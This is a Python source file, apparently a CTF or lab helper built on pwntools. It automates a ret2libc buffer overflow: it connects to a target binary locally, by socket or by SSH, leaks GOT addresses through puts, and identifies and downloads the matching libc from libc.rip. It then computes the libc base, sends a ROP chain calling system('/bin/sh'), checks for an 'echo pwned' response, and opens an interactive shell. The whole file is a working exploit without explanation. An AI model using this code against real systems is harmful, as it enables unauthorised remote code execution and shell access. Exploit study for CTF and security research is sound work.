# pyright: reportMissingImports=false, reportUndefinedVariable=false
from pwn import *
import requests
import os
import re


class Overflow_ret2libc():
	def __init__(self, args, offset):
		self.properties = args
		self.offset = offset
		self.elf = ELF(self.properties["binary"])
		self.offset_leaking = self.elf.process()
		self.rop = ROP(self.elf)
		self.url_libc = "https://libc.rip/"
		self.info = {}
		if self.properties.get("ip") is not None and self.properties.get("port") is not None:
			try:
				self.io = remote(self.properties["ip"],self.properties["port"])
			except Exception as e:
				log.warning("Couldn't connect... Aborting.")
				log.warning(e)
				exit(-1)
		elif self.properties.get("ssh") is not None and self.properties.get("ssh_port") is not None:
			try:
				self.io = ssh(host=self.properties["ssh"], port=self.properties["ssh_port"], 
				user=self.properties["ssh_user"], password=self.properties["ssh_password"]
				)
			except Exception as e:
				log.warning("Couldn't connect... Aborting.")
				log.warning(e)
				exit(-1)
		else:
			self.io = self.elf.process()
		context.arch = self.properties.get("arch") or "amd64"

	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
		try:
			instance.call(*args)
		except exception:
			log.warning(message)
			callback()

	def payload_generator(self, instance, offset):
		payload = [
			b"A"*offset,
			instance.chain()
		]
		payload = b"".join(payload)
		return payload

	def join_cwd(self, path):
		return os.path.join(os.getcwd(), path)

	def main(self):
		log.info("Leaking address")
		self.info["available_funcs"] = tuple(name for name in self.elf.got.keys() if name in [
								'puts', 'gets', 'printf', 'read'])
		for func in self.info["available_funcs"]:
			self.recovery(self.rop, f"No {func} in GOT",
						  self.elf.symbols["puts"], [self.elf.got[func]])
		self.recovery(self.rop, f"No main found...", self.elf.symbols["main"])
		payload1 = self.payload_generator(self.rop, self.offset)
		self.io.sendline(payload1)

		leaked_addr_list, leaked_list = [], []
		output = self.io.recv().split(b'\n')

		for resp in output:
			if "\\x" in str(resp):
				leaked_list.append(resp)
		i=0
		for name in self.info["available_funcs"]: 
			leaked = u64(leaked_list[i].rstrip().ljust(8, b"\x00"))
			log.info(f"Address of {name} found at {hex(leaked)}")
			leaked_addr_list.append(hex(leaked))
			i+=1
		
		json_data = {"symbols":{}}
		for addr, func in zip(leaked_addr_list, self.info["available_funcs"]):
			json_data["symbols"][func] = addr
		
		page = requests.post(self.url_libc+"api/find",json=json_data)
		libc_found = re.search("(?P<url>https?://[^\\s]+)", page.content.decode('utf-8')).group("url")[:-2]
		log.info("Testing with following LIBC: " + libc_found[26:])
		
		if libc_found != "":
			if (libc_found[26:]) not in os.listdir('./libc/'):
				req = requests.get(libc_found, allow_redirects=True)
				open("./libc/"+libc_found[26:],'wb').write(req.content)
				LIBC = "./libc/" + str(libc_found[26:])
			else:
				LIBC = "./libc/" + str(libc_found[26:])
			if LIBC:
				self.libc = ELF(LIBC) 
				self.libc.address = leaked - self.libc.symbols[self.info["available_funcs"][-1]]
				log.info(f"base libc @ {hex(self.libc.address)}")
		else:
			log.warning("Couldn't find LIBC... Aborting.")
			exit(-1)

		self.roplibc = ROP(self.libc)
		self.recovery(self.roplibc, "Didn't find system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
		self.recovery(self.roplibc,"Didn't find exit...","exit")

		payload2 = self.payload_generator(self.roplibc, self.offset)

		self.io.sendline(payload2)
		try: 
			sleep(1)
			self.io.sendline(b'echo "pwned"\n')
			resp = self.io.recvline()
			if b"pwned" in resp:
				log.info("Enjoy that sweet shell!")
				self.io.interactive()
				return "pwned"
		except:
			return self.info